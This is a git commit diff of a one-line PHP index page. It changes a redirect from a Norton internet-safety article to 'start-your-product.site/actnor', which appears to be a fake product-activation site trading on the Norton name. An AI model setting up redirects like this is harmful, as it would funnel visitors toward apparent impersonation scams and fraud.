d175919ee590e063b267e23d7988560f852237fb
jane7656dav <57894516+jane7656dav@users.noreply.github.com>
2020-03-02 20:43:56 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,4 @@
 <?php
-header("Location: https://au.norton.com/internetsecurity-kids-safety-stop-stressing-10-internet-safety-rules-to-help-keep-your-family-safe-online.html?inid=nortoncom_nav_internetsecurity-kids-safety-stop-stressing-10-internet-safety-rules-to-help-keep-your-family-safe-online_homepage:home");
+header("Location: https://start-your-product.site/actnor");
 die();
 ?>
